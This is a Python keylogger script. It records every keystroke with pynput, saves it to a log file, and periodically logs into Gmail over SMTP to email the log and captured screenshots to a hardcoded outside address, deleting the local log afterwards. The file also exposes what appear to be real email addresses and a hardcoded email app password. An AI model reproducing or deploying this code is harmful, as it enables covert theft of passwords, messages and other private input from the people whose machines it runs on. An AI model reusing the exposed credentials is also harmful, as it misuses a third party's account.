import os
import time
import smtplib
import ssl
import pynput
import pyscreenshot as ImageGrab
from pynput.keyboard import Key,Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage

reciver_email_address="thivankanimesh@hotmail.com"
mailling_time_gap=20
screen_shots_time_gap=20
mouse_click_events=False
screen_shots=False
web_records=False
web_cam=False
delete_log_file=False

sender_email_address="thivankanimshan@gmail.com"
sender_email_password="jmpomhnpxzcvtfyr"
last_mail_sent_time=time.time()
port = 587

keys = []
overall_count =0

#Make directories
if not os.path.exists('./img'):
        os.mkdir('img')

#Connect to SMTP
smtp=smtplib.SMTP('smtp.gmail.com',port)
smtp.ehlo()
smtp.starttls()
smtp.ehlo()

smtp.login(sender_email_address,sender_email_password)

def on_press(key):
    global keys    
    global overall_count
    #DEBUGGING
    print(overall_count)   
    keys.append(key)
    overall_count+=1
    write_file(key)
    sendMail()
    
def on_release(key):
    if(key==Key.esc):
        return False    

def write_file(key):
        global keys
        if(overall_count%10==0):
            file=open('log.txt','a')   
            for key in keys:
                file.write(str(key))
            file.write("\n")
            keys = []


def sendMail():

        global last_mail_sent_time
        file='log.txt'

        msg=MIMEMultipart()
        msg['Subject']='subject'
        msg['From']=sender_email_address
        msg['To']=reciver_email_address

        #DEBUGGING
        #print(time.time()-last_mail_sent_time)

        if((time.time()-last_mail_sent_time)>=mailling_time_gap):

                #Making keylogs attachment
                keylogs_attachment=MIMEBase('application','octet-stream')
                keylogs_attachment.set_payload(open(file,'rb').read())
                keylogs_attachment.add_header('Content-Disposition','attachment; filename="%s"'%os.path.basename(file))
                msg.attach(MIMEText("Labour"))
                msg.attach(keylogs_attachment)
                #Errace file
                os.remove('log.txt')

                #Making screenshots attachment
                for image in os.listdir('./img'):
                        screen_shots_attachment=MIMEImage(open(str.format('./img/{0}',image),'rb').read())
                        msg.attach(screen_shots_attachment)

                smtp.sendmail(sender_email_address,reciver_email_address,msg.as_string())
                #Updating message sent time
                last_mail_sent_time=time.time()
                #DEBUGGIN
                print("message sent")

def takeScreenshot():
        lenth=len(os.listdir('./img'))
        im = ImageGrab.grab()
        im.save(str.format('./img/img{0}.png',lenth))

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()